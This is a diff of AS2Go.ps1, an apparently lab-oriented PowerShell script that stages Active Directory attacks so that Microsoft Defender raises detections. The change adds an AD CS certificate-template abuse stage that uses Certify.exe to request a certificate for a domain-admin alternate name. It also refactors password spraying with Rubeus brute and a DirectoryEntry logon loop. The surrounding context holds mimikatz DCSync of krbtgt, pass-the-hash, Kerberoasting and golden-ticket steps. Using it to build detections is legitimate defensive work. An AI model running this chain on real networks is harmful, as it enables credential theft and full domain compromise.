@@ -20,8 +20,8 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2022-11-04
-File Name  : AS2Go.ps1 | Version 2.5.6
+last update: 2022-11-09
+File Name  : AS2Go.ps1 | Version 2.5.7
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
 
@@ -46,6 +46,7 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
+# 2022-11-04 | v2.5.7 |  ADD Function xxxxx
 # 2022-11-04 | v2.5.6 |  ADD Function New-PasswordSprayAttack
 # 2022-10-15 | v2.5.5 |  ADD Function Kerberoasting
 # 2022-10-13 | v2.1.1 |  Update Function Start-AS2GoDemo | Protected User Error Routine
@@ -71,6 +72,8 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
+#region Global Settings
+
 $lastupdate   = "2022-11-04"
 $version      = "2.5.6.0" 
 $path         =  Get-Location
@@ -93,6 +96,7 @@ $stage00 = "COMPROMISED User Account"
 $stage05 = "BRUCE FORCE or PW SPRAY"
 $stage10 = "RECONNAISSANCE"
 $stage20 = "LATERAL MOVEMENT"
+$stage25 = "Steal or Forge Authentication Certificates"
 $stage30 = "ACCESS SENSITIVE DATA"
 $stage40 = "DOMAIN COMPROMISED"
 $stage50 = "COMPLETE"
@@ -110,13 +114,172 @@ $GroupDA   = (Get-ADGroup -Filter * -Properties * | where {($_.SID -like "*-512"
 $GroupEA   = (Get-ADGroup -Filter * -Properties * | where {($_.SID -like "*-519")}).name
 $GroupGPO  = (Get-ADGroup -Filter * -Properties * | where {($_.SID -like "*-520")}).name
 
+#endregion Global Settings
+
 ################################################################################
 ######                                                                     #####
 ######                            All Functions                            #####
 ######                                                                     #####
 ################################################################################
 
-Function New-PasswordSprayAttack()
+function template{
+
+    [CmdletBinding()]
+    Param(
+    [Parameter(Mandatory=$True)]
+    [string]
+    $question,
+
+    [Parameter(Mandatory=$False)]
+    [string]
+    $defaultValue
+    )
+
+$myfunction = Get-FunctionName
+Write-Log -Message "### Start Function $myfunction ###"
+#####
+
+
+#####
+Write-Log -Message "### End Function $myfunction ###"
+}
+
+
+#region AS2GO Functions
+
+
+function FindVulnerableCATemplates{
+
+    Param([Parameter(Mandatory=$False)][string] $altname)
+
+
+$myfunction = Get-FunctionName
+Write-Log -Message "### Start Function $myfunction ###"
+#####
+
+Write-Host "Step 1 - Finding Vulnerable Certificate Templates " -ForegroundColor $global:FGCHighLight -NoNewline
+Write-host "- certify.exe find /vulnerable"
+pause
+#get the Enterprise CA name
+$MyCAConfig = Invoke-Command -ScriptBlock {certutil}
+$temp = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027)
+$myEntCA = $temp[1]
+
+#find vulnerable CA templates
+Invoke-Command -ScriptBlock {.\certify.exe find /vulnerable}
+pause
+
+#get the Enterprise CA name
+$result = certutil -config $myEntCA -ping
+$CAtemplate = "AS2Go"
+#$altname =    "da-cert"
+$pemFile =    ".\$altname.pem"
+$text = "copy the certificate content printed out by certify and paste it into this file"
+
+
+Write-Host "Step 2 - Requesting Certificate with Certify" -ForegroundColor $global:FGCHighLight
+Write-host "Do you want to use this CA template - $CAtemplate " -ForegroundColor Yellow
+
+pause
+
+
+if (!(Test-Path $pemFile))
+{
+  New-Item -path . -name $pemFile -type "file" -value $text
+}
+else
+{
+  Set-Content -path $pemFile -value $text
+}
+
+# more content to this file
+Add-Content -path $pemFile -value "Save this file"
+Add-Content -path $pemFile -value "Please remove this lines before"
+
+
+#Request a Certificates
+If ($result[2].ToLower().Contains("successfully") -eq $True)
+{
+   Invoke-Command -ScriptBlock {.\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname}
+   Invoke-Command -ScriptBlock {notepad $pemFile}
+   Write-Log -Message "The certificate retrieved is in a PEM format - $pemFile"
+}
+else
+{
+   Write-Host $result[1] -ForegroundColor red
+   Write-Host $result[3]
+   Write-Host $result[4]
+}
+pause
+
+
+#####
+Write-Log -Message "### End Function $myfunction ###"
+
+return $pemFile
+}
+
+
+function Prepare-BruceForceAttack{
+
+
+$myfunction = Get-FunctionName
+Write-Log -Message "### Start Function $myfunction ###"
+#####
+
+Write-Host "`nCurrent Default Domain Password Policy Settings:" -ForegroundColor $global:FGCHighLight
+Get-ADDefaultDomainPasswordPolicy
+pause
+
+$MyDomain = $env:USERDNSDOMAIN
+$MyPath   = Get-KeyValue -key "MySearchBase"
+$NoU      = (Get-ADUser -filter * -SearchBase $MyPath).count
+
+#first run with random password
+$MyPW01 = Get-RandomPassword
+#second run with valid password
+$MyPW02 = Get-KeyValue -key "SP01"
+
+Do
+{
+$question = "`nDo you like to use this password '$MyPW02' for the second next run - Y or N? Default "
+$prompt   = Get-Answer -question $question -defaultValue $yes
+
+if ($prompt -ne $yes) 
+   {
+   $MyPW02 = Read-Host "Enter new password"
+   Set-KeyValue -key "SP01" -NewValue $MyPW02
+   }
+   
+} Until ($prompt -eq $yes)
+
+
+
+# example - First run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp       
+Write-Host "`nFirst run with password " -NoNewline; Write-host $MyPW01 -NoNewline -ForegroundColor Yellow
+Write-Host " against "-NoNewline;Write-Host $NoU -NoNewline -ForegroundColor Yellow
+Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yellow
+
+# example - Second run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp    
+Write-Host "Second run with password " -NoNewline; Write-host $MyPW02 -NoNewline -ForegroundColor Yellow
+Write-Host " against "-NoNewline;Write-Host $NoU -NoNewline -ForegroundColor Yellow
+Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yellow
+Write-Host ""
+pause
+
+#Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath -NoR "1 of 2"
+
+Invoke-Command -ScriptBlock {.\Rubeus.exe brute /password:$MyPW01 /noticket}
+
+Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath -NoR "2 of 2"
+Write-Host ""
+pause
+
+#####
+Write-Log -Message "### End Function $myfunction ###"
+}
+
+Function Start-PasswordSprayAttack
 {
 
     Param([string] $Domain, [string] $Password, [string] $SearchBase, [string] $NoR)
@@ -127,6 +290,7 @@ Function New-PasswordSprayAttack()
         $Step = 0
         $ADUSers = Get-Aduser -filter * -SearchBase $SearchBase
         $TotalSteps = $ADUsers.Count
+        $specChar = [char]0x00BB
         
         Foreach ($ADUSer in $ADUsers) 
         {
@@ -138,7 +302,7 @@ Function New-PasswordSprayAttack()
            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry("",$user,$Password)
            if ($Domain_check.name -ne $null)
               {
-              Write-Host -ForegroundColor Green "[*] MATCH - User:$User Password:$Password"
+              Write-Host "Bingo $specChar User:$User Password:$Password" -ForegroundColor Yellow
               }
          }
 
@@ -147,15 +311,12 @@ Write-Log -Message "### End Function $myfunction ###"
 
 }
 
-
 Function Set-ProgressBar 
 {
     Param ([int] $Step, [int] $TotalSteps, [string] $User)
     $progress = [int] (($Step - 1) / $TotalSteps * 100)
     Write-Progress -Activity "Run Password Spray against user $User" -status "Completed $progress % of Password Spray Attack" -PercentComplete $progress
 }
-
-
 
 function SimulateRansomare
 {
@@ -224,8 +385,6 @@ If ($answer -eq $yes)
 Write-Log -Message "### End Function $myfunction ###"
 }
 
-
-
 function Get-Directories {
     param ([string] $Path)
 
@@ -250,7 +409,6 @@ function Get-Directories {
     return $dirs
 }
 
-
 function Get-Files {
     param ([string] $Path, [string] $FileType)
     
@@ -271,9 +429,6 @@ function Get-Files {
     Start-Sleep -Seconds 1
     return $files
 }
-
-
-
 
 Function CreateGoldenTicket
 {
@@ -315,6 +470,7 @@ Write-Log -Message "### Start Function $myfunction ###"
         If ($answer -eq $yes)
             {
             .\mimikatz.exe "log .\$sFakeUser.log" "lsadump::dcsync /domain:$fqdn /user:krbtgt"  "exit"
+           # Invoke-Command -ScriptBlock {}
             Invoke-Item ".\$sFakeUser.log"
             Pause
             }
@@ -390,10 +546,6 @@ Write-Log -Message "### Start Function $myfunction ###"
 Write-Log -Message "### End Function $myfunction ###"
 }
 
-
-
-
-
 function Restart-VictimMachines
 {
 
@@ -464,29 +616,6 @@ foreach ( $computer in $computers)
 # last, but not least
 shutdown /r /f /c $commment /t $time2reboot /m \\$env:COMPUTERNAME
 
-
-
-#####
-Write-Log -Message "### End Function $myfunction ###"
-}
-
-function template
-{
-
-    [CmdletBinding()]
-    Param(
-    [Parameter(Mandatory=$True)]
-    [string]
-    $question,
-
-    [Parameter(Mandatory=$False)]
-    [string]
-    $defaultValue
-    )
-
-$myfunction = Get-FunctionName
-Write-Log -Message "### Start Function $myfunction ###"
-#####
 
 
 #####
@@ -994,7 +1123,6 @@ Write-Log -Message "### End Function random password ###"
 return $newPassword
 }
 
-
 function Get-AS2GoSettings {
 
 
@@ -1029,7 +1157,7 @@ $myViPC =         Get-KeyValue -key "myViPC"
 $fqdn =           Get-KeyValue -key "fqdn"
 $pthntml =        Get-KeyValue -key "pthntml"
 $krbtgtntml =     Get-KeyValue -key "krbtgtntml"
-$ImageViewer =    Get-KeyValue -key "ImageViewer"
+$OpenSSL =    Get-KeyValue -key "OpenSSL"
 $globalHelpDesk = Get-KeyValue -key "globalHelpDesk"
 $ticketsUNCPath = Get-KeyValue -key "ticketsPath"
 $ticketsDir     = Get-KeyValue -key "ticketsDir"
@@ -1062,7 +1190,7 @@ $MyParameter = @("Logon Server / DC         ",`
                  "Tickets UNC Path (suffix) ",`
                  "Tickets Directory         ",`
                  "NTDS Dit File (Backup)    ",`
-                 "Image Viewer              ")
+                 "OpenSSL start path        ")
 
 $MyValue     = @($myDC,`
                  $myViPC,`
@@ -1080,7 +1208,7 @@ $MyValue     = @($myDC,`
                  $ticketsUNCPath,`
                  $ticketsDir,`
                  $OfflineDITFile,`
-                 $ImageViewer)
+                 $OpenSSL)
 
 $MyKey       = @("myDC",`
                  "myViPC",`
@@ -1098,7 +1226,7 @@ $MyKey       = @("myDC",`
                  "ticketsUNCPath",`
                  "ticketsDir",`
                  "OfflineDITFile",`
-                 "ImageViewer")
+                 "OpenSSL")
 
 
 
@@ -1195,7 +1323,6 @@ Write-Log -Message $directory
 Write-Log -Message "### End Function $myfunction ###"
 }
 
-
 function Access-Directory1 {
 
     [CmdletBinding()]
@@ -1238,7 +1365,6 @@ Write-Host "`n   --> No(!) ACCESS to direcotry '$directory'`n"    -ForegroundCol
 Write-Log -Message $directory
 Write-Log -Message "### End Function $myfunction ###"
 }
-
 
 function Get-SensitveADUser {
 
@@ -1376,9 +1502,7 @@ Do
 } Until ($prompt -eq $yes)
 
 
-
-
-.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:$helpdeskuser /ntlm:$pthntml /domain:$fqdn" "exit"
+Invoke-Command -ScriptBlock {.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:$helpdeskuser /ntlm:$pthntml /domain:$fqdn" "exit"}
 
 
 Write-Host "____________________________________________________________________`n"  -ForegroundColor Red
@@ -1739,7 +1863,7 @@ Function Show-Step {
    )
 
 Invoke-Item ".\$step"
-#& $ImageViewer "$path\$step"
+#& $OpenSSL "$path\$step"
 
 
 }
@@ -1822,6 +1946,8 @@ Write-Log -Message "### End Function $myfunction ###"
 }
 
 
+#endregion AS2GO Functions
+
 ################################################################################
 ######                                                                     #####
 ######                         START the Script                            #####
@@ -1846,6 +1972,7 @@ $FileVersionM = Check-FileAvailabliy -filename "mimikatz.exe"
 $FileVersionP = Check-FileAvailabliy -filename "PsExec.exe"
 $FileVersionR = Check-FileAvailabliy -filename "Rubeus.exe"
 $FileVersionN = Check-FileAvailabliy -filename "NetSess.exe"
+$FileVersionC = Check-FileAvailabliy -filename "Certify.exe"
 
 Check-PoSHModuleAvailabliy -PSModule "ActiveDirectory"
 Import-Module ActiveDirectory
@@ -1893,16 +2020,15 @@ Write-Host "                                                                    
 Write-Host "        ●  ACTIVE DIRECTORY PoSH module                       "
 Write-Host "        ●  Mimikatz.exe   $FileVersionM                            "
 Write-Host "        ●  Rubeus.exe     $FileVersionR                            "
+Write-Host "        ●  Certify.exe    $FileVersionC                            "
 Write-Host "        ●  NetSess.exe    $FileVersionN                            "
-Write-Host "        ●  PsExec.exe     $FileVersionP                            n"
+Write-Host "        ●  PsExec.exe     $FileVersionP                            "
 Write-Host "____________________________________________________________________`n" 
 
 $TimeStamp    = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
 $lastVictim   = Get-KeyValue -key "LastVictim"
 $lastRun      = Get-KeyValue -key "LastStart" 
 $lastDuration = Get-KeyValue -key "LastDuration" 
-
-
 
 Write-Host "`n  Current Date & Time: $TimeStamp" 
 Write-Host ""
@@ -1926,13 +2052,13 @@ Pause
 Clear-Host
 Get-AS2GoSettings
 
-
-
 ################################################################################
 ######                                                                     #####
 ######                Attack Level -  Bruce Force Account                  #####
 ######                                                                     #####
 ################################################################################
+
+#region Attack Level -  Bruce Force Account 
 
 Clear-Host
 Update-WindowTitle -NewTitle $stage05
@@ -1951,51 +2077,7 @@ $answer   = Get-Answer -question $question -defaultValue $No
 
 If ($answer -eq $yes)
 {
-
-Write-Host "`nCurrent Default Domain Password Policy Settings:" -ForegroundColor $global:FGCHighLight
-Get-ADDefaultDomainPasswordPolicy
-pause
-
-$MyDomain = $env:USERDNSDOMAIN
-$MyPath   = Get-KeyValue -key "MySearchBase"
-$NoU      = (Get-ADUser -filter * -SearchBase $MyPath).count
-
-#first run with random password
-$MyPW01 = Get-RandomPassword
-#second run with valid password
-$MyPW02 = Get-KeyValue -key "SP01"
-
-Do
-{
-$question = "`nDo you like to use this password '$MyPW02' for the second next run - Y or N? Default "
-$prompt   = Get-Answer -question $question -defaultValue $yes
-
-if ($prompt -ne $yes) 
-   {
-   $MyPW02 = Read-Host "Enter new password"
-   Set-KeyValue -key "SP01" -NewValue $MyPW02
-   }
-   
-} Until ($prompt -eq $yes)
-
-
-
-# example - First run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp       
-Write-Host "`nFirst run with password " -NoNewline; Write-host $MyPW01 -NoNewline -ForegroundColor Yellow
-Write-Host " against "-NoNewline;Write-Host $NoU -NoNewline -ForegroundColor Yellow
-Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yellow
-
-# example - Second run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp    
-Write-Host "Second run with password " -NoNewline; Write-host $MyPW02 -NoNewline -ForegroundColor Yellow
-Write-Host " against "-NoNewline;Write-Host $NoU -NoNewline -ForegroundColor Yellow
-Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yellow
-Write-Host ""
-pause
-
-New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath -NoR "1 of 2"
-New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath -NoR "2 of 2"
-Write-Host ""
-pause
+    Prepare-BruceForceAttack
 }
 elseIf ($answer -eq $exit)
 {
@@ -2004,6 +2086,7 @@ elseIf ($answer -eq $exit)
 else
 {
 }
+
 
 
 Clear-Host
@@ -2033,7 +2116,7 @@ $myViPC =         Get-KeyValue -key "myViPC"
 $fqdn =           Get-KeyValue -key "fqdn"
 $pthntml =        Get-KeyValue -key "pthntml"
 $krbtgtntml =     Get-KeyValue -key "krbtgtntml"
-$ImageViewer =    Get-KeyValue -key "ImageViewer"
+$OpenSSL =        Get-KeyValue -key "OpenSSL"
 $globalHelpDesk = Get-KeyValue -key "globalHelpDesk"
 $ticketsUNCPath = Get-KeyValue -key "ticketsPath"
 $ticketsDir     = Get-KeyValue -key "ticketsDir"
@@ -2107,13 +2190,15 @@ Set-KeyValue -key "LastVictim" -NewValue $victim
 
 
 Pause
-
+#endregion Attack Level -  Bruce Force Account 
 
 ################################################################################
 ######                                                                     #####
 ######                Attack Level - COMPROMISED User Account              #####
 ######                                                                     #####
 ################################################################################
+
+#region Attack Level - COMPROMISED User Account
 
 Update-WindowTitle -NewTitle $stage00
 #Set-KeyValue -key "LastStage" -NewValue $stage10
@@ -2236,12 +2321,16 @@ $repeat   = Get-Answer -question $question -defaultValue $no
    
 } Until ($repeat -eq $no)
 
+#endregion Attack Level - COMPROMISED User Account
 
 ################################################################################
 ######                                                                     #####
 ######                Attack Level - RECONNAISSANCE                        #####
 ######                                                                     #####
 ################################################################################
+
+#region Attack Level - RECONNAISSANCE
+
 Update-WindowTitle -NewTitle $stage10
 #Set-KeyValue -key "LastStage" -NewValue $stage10
 Show-Step -step "step_006.html"
@@ -2292,12 +2381,15 @@ $repeat   = Get-Answer -question $question -defaultValue $no
    
 } Until ($repeat -eq $no)
 
+#endregion Attack Level RECONNAISSANCE
 
 ################################################################################
 ######                                                                     #####
 ######                Attack Level - LATERAL MOVEMENT                      #####
 ######                                                                     #####
 ################################################################################
+
+#region Attack Level - LATERAL MOVEMENT
 
 Update-WindowTitle -NewTitle $stage20
 Set-KeyValue -key "LastStage" -NewValue $stage20
@@ -2344,6 +2436,62 @@ $repeat   = Get-Answer -question $question -defaultValue $no
    
 } Until ($repeat -eq $no)
 
+#endregion Attack Level - LATERAL MOVEMENT
+
+################################################################################
+######                                                                     #####
+######      Attack Level - Steal or Forge Authentication Certificates      #####
+######                                                                     #####
+################################################################################
+
+#region Attack Level - Forge Authentication Certificates
+
+Update-WindowTitle -NewTitle $stage25
+Set-KeyValue -key "LastStage" -NewValue $stage25
+Show-Step -step "step_007.html"
+Do 
+{
+Clear-Host
+Write-Host "____________________________________________________________________`n" 
+Write-Host "       Attack Level - Steal or Forge Authentication Certificates    "
+Write-Host ""
+Write-Host "    Abuse misconfigured AD CS certificate templates to impersonate  "
+Write-Host "    admin users and create additional authentication certificates   "
+Write-Host "____________________________________________________________________`n" 
+
+# http://attack.mitre.org/techniques/T1649/
+
+$question = "`nDo you want to run this step - Y or N? Default "
+$answer   = Get-Answer -question $question -defaultValue $No
+
+If ($answer -eq $yes)
+
+{
+    
+    $PemToPFXFile  = FindVulnerableCATemplates -altname $domainadmin
+    
+    #Starting Pass-the-Hash (PtH) Attack on VictimPC
+    #Show-Step -step step_007_PtH.html  
+    #Start-PtH-Attack
+
+
+
+}
+
+
+Clear-Host
+
+Write-Host "____________________________________________________________________`n" 
+Write-Host "    ??? REPEAT | Attack Level - Steal or Forge Certificates ???           "
+Write-Host "____________________________________________________________________`n" 
+
+
+$question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+$repeat   = Get-Answer -question $question -defaultValue $no
+   
+} Until ($repeat -eq $no)
+
+#endregion Attack Level - Forge Authentication Certificates
 
 
 ################################################################################
@@ -2355,6 +2503,8 @@ $repeat   = Get-Answer -question $question -defaultValue $no
 ######                                                                     #####
 ################################################################################
 
+#region Attack Level -  Kerberoasting Attack
+
 Update-WindowTitle -NewTitle $stage20
 Set-KeyValue -key "LastStage" -NewValue $stage20
 #Show-Step -step "step_007.html"
@@ -2363,12 +2513,15 @@ Do
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
 Write-Host "                 Attack Level -  Kerberoasting Attack               "
+Write-Host ""
+Write-Host "        AS2Go uses Rubeus.exe to request a service ticket           "
+Write-Host "            for any service with a registered SPN`n"
 Write-Host "____________________________________________________________________`n" 
 
 $myDomain = $env:USERDNSDOMAIN
 $hashes   = "$myDomain.hashes.txt"
 
-write-host "AS2Go uses Rubeus.exe to request a service ticket for any service with a registered SPN`n"
+#write-host "AS2Go uses Rubeus.exe to request a service ticket for any service with a registered SPN`n"
 Write-Host "NEXT STEP: " -NoNewline
 Write-Host ".\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes" -ForegroundColor $global:FGCCommand
 
@@ -2378,7 +2531,7 @@ $answer   = Get-Answer -question $question -defaultValue $No
 If ($answer -eq $yes)
 {   
 
-   .\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes
+    Invoke-Command -ScriptBlock {.\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes}
     Invoke-Item .\$hashes
     
     pause
@@ -2404,12 +2557,16 @@ $repeat   = Get-Answer -question $question -defaultValue $no
    
 } Until ($repeat -eq $no)
 
+#endregion Attack Level -  Kerberoasting Attack
+
 
 ################################################################################
 ######                                                                     #####
 ######                Attack Level - ACCESS SENSITIVE DATA                 #####
 ######                                                                     #####
 ################################################################################
+
+#region Attack Level -  ACCESS SENSITIVE DATA
 
 Update-WindowTitle -NewTitle $stage30
 Set-KeyValue -key "LastStage" -NewValue $stage30
@@ -2450,12 +2607,16 @@ $repeat   = Get-Answer -question $question -defaultValue $no
    
 } Until ($repeat -eq $no)
 
+#endregion Attack Level -  ACCESS SENSITIVE DATA
 
 ################################################################################
 ######                                                                     #####
 ######                Attack Level - DOMAIN COMPROMISED AND PERSISTENCE    #####
 ######                                                                     #####
 ################################################################################
+
+#region Attack Level -  DOMAIN COMPROMISED AND PERSISTENCE
+
 Update-WindowTitle -NewTitle $stage40
 Set-KeyValue -key "LastStage" -NewValue $stage40
 Show-Step step_012.html
@@ -2596,6 +2757,9 @@ Write-Host "____________________________________________________________________
 
    
 } Until ($repeat -eq $no)
+
+
+#endregion Attack Level -  DOMAIN COMPROMISED AND PERSISTENCE
 
 ################################################################################
 ######                                                                     #####
